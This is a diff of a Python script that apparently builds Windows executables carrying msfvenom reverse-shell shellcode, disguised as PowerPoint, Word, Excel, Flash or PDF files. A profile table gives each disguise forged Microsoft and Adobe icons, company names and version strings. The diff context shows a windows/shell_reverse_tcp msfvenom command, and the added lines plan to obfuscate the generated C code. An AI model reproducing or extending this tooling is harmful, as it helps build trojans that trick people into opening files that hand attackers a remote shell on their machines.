@@ -9,6 +9,11 @@ $ msfvenom -p windows/shell_reverse_tcp -f raw -b '\\x00\\xff' LHOST=192.168.56.
 
 Refs:
 - https://msdn.microsoft.com/en-us/library/aa381043(v=vs.85).aspx
+
+ToDo:
+- dll generation
+- multi byte key
+- obfuscate generated C code
 """
 
 import sys
@@ -24,11 +29,11 @@ MINGW_BIN = HOME + "/.wine/drive_c/MinGW/bin"
 ICO_DIR = HOME + "/ico"
 PROFILES = {
         # index : [Version, /path/to/ico, CompanyName, Description, Name, CopyrightName]
-        "powerpoint": [ICO_DIR+"/powerpoint.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft PowerPoint presentation", "PowerPoint", "Microsoft PowerPoint", "powerpoint.exe", ".pptx"],
-        "word": [ICO_DIR+"/word.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft Word document", "Word", "Microsoft Word", "word.exe", ".docx"],
-        "excel": [ICO_DIR+"/excel.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft Excel document", "Excel", "Microsoft Excel", "excel.exe", ".xlsx"],
-        "flash": [ICO_DIR+"/flash.ico", "11,0,0,0", "Adobe Systems Incorporated", "Adobe Flash macro", "Flash", "Adobe Flash", "flash.swf", ".swf"],
-        "pdf": [ICO_DIR+"/pdf.ico", "13,0,0,0", "Adobe Systems Incorporated", "Embedded Adobe PDF document", "Adobe PDF Reader", "Adobe AcroRead", "AcroReader.exe", ".pdf"],
+        "powerpoint":   [ICO_DIR+"/powerpoint.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft PowerPoint presentation", "PowerPoint", "Microsoft PowerPoint", "powerpoint.exe", ".pptx"],
+        "word":         [ICO_DIR+"/word.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft Word document", "Word", "Microsoft Word", "word.exe", ".docx"],
+        "excel":        [ICO_DIR+"/excel.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft Excel document", "Excel", "Microsoft Excel", "excel.exe", ".xlsx"],
+        "flash":        [ICO_DIR+"/flash.ico", "11,0,0,0", "Adobe Systems Incorporated", "Adobe Flash macro", "Flash", "Adobe Flash", "flash.swf", ".swf"],
+        "pdf":          [ICO_DIR+"/pdf.ico", "13,0,0,0", "Adobe Systems Incorporated", "Embedded Adobe PDF document", "Adobe PDF Reader", "Adobe AcroRead", "AcroReader.exe", ".pdf"],
         }
 
 def echo(fd, m):
